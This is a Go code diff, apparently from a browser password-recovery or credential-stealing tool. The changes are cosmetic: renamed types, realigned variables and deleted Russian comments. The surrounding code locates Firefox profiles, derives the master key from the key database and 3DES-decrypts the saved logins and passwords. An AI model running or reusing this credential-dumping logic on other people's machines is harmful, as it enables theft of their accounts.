@@ -117,7 +117,7 @@ func mozillaDecrypt3DES(globalSalt, master_password string, entrySalt, encrypted
 		iv = k[len(k)-8:]
 		key = k[:24]
 
-		data = tripleDesDecrypt(encryptedPasswd, key, iv) // Done
+		data = tripleDesDecrypt(encryptedPasswd, key, iv)
 	)
 	return data
 }
@@ -175,11 +175,11 @@ func mozillaGetShortLE(header []byte, offset int) uint16{
 	return binary.LittleEndian.Uint16(header[offset:offset+2])
 }
 
-type DirRange []uint16
+type offsetsRange []uint16
 
-func (a DirRange) Len() int           { return len(a) }
-func (a DirRange) Swap(i, j int)      { a[i], a[j] = a[j], a[i] }
-func (a DirRange) Less(i, j int) bool { return a[i] < a[j] }
+func (a offsetsRange) Len() int           { return len(a) }
+func (a offsetsRange) Swap(i, j int)      { a[i], a[j] = a[j], a[i] }
+func (a offsetsRange) Less(i, j int) bool { return a[i] < a[j] }
 
 func mozillaReadBsdDB(path string) map[string]string{
 	var readDB, err = os.Open(path)
@@ -210,11 +210,11 @@ func mozillaReadBsdDB(path string) map[string]string{
 		var offsets = make([]byte, (nkeys+1)*4+2)
 		readDB.Read(offsets)
 		var(
-			offsetVals DirRange
-			i = 0
-			nval uint16 = 0
-			val uint16 = 1
-			keys = 0
+			offsetVals offsetsRange
+			i           = 0
+			nval       uint16 = 0
+			val        uint16 = 1
+			keys        = 0
 		)
 
 		for nval != val{
@@ -280,7 +280,7 @@ func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, maste
 
 	var(
 		privKeyData = privKeyEntryASN1.PrivKeyData
-		entrySalt = privKeyEntryASN1.Data.DataSalt.EntrySalt
+		entrySalt   = privKeyEntryASN1.Data.DataSalt.EntrySalt
 	)
 	var privKey = mozillaDecrypt3DES(globalSalt, "", entrySalt, privKeyData)
 
@@ -288,9 +288,9 @@ func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, maste
 	asn1.Unmarshal(privKey, &PrivKeyRaw)
 
 	var (
-		nudeBytes = string(PrivKeyRaw.OtherData.Bytes) // Эта хрень не хотела нормально читаться в структуру.
-		already = strings.Split(nudeBytes, string("\x02")) // TODO КОСТЫЛЬ
-		key = []byte(already[4][1:])
+		nudeBytes       = string(PrivKeyRaw.OtherData.Bytes)       // Эта хрень не хотела нормально читаться в структуру.
+		allDataFromAsn1 = strings.Split(nudeBytes, string("\x02")) // TODO КОСТЫЛЬ
+		key             = []byte(allDataFromAsn1[4][1:])
 	)
 
 	return key
@@ -308,7 +308,7 @@ func getMozillaKey(profilePath string, app string) []byte{
 
 		for rows.Next(){
 			rows.Scan(&item1, &item2)
-			var globalSalt, _, _ = mozillaManageMasterPassword(item1, item2) // GlobalSalt правильно
+			var globalSalt, _, _ = mozillaManageMasterPassword(item1, item2)
 
 			if globalSalt != ""{
 				rows2, _ := db.Query("SELECT a11,a102 FROM nssPrivate")
@@ -360,7 +360,7 @@ func mozillaDecodeLoginData(data string) decodedLogindata {
 	if errUnmarshal!=nil{
 		log.Print("Error -", errUnmarshal.Error())
 	}
-	var returned = decodedLogindata{sourceData.KeyId, sourceData.SomeInfo.Lv, sourceData.CipherText} // Абсолютно верно
+	var returned = decodedLogindata{sourceData.KeyId, sourceData.SomeInfo.Lv, sourceData.CipherText}
 
 	return returned
 }
@@ -395,7 +395,7 @@ func mozillaModuleStart(data AppInfo) {
 		for i := range profiles {
 			log.Println("Profile path found - ", profiles[i])
 			var(
-				key = getMozillaKey(profiles[i], data.name) // Правильно
+				key = getMozillaKey(profiles[i], data.name)
 				credentials = mozillaGetLoginData(profiles[i])
 			)
 			if len(key) > 24{
@@ -404,7 +404,7 @@ func mozillaModuleStart(data AppInfo) {
 
 			for j := range credentials{
 				var (
-					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv) //Костыль
+					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv)
 					passwordWithTrash = tripleDesDecrypt(credentials[j].passWord.cipherText, key, credentials[j].passWord.Iv)
 				)
 				if len(loginWithTrash) == 0{
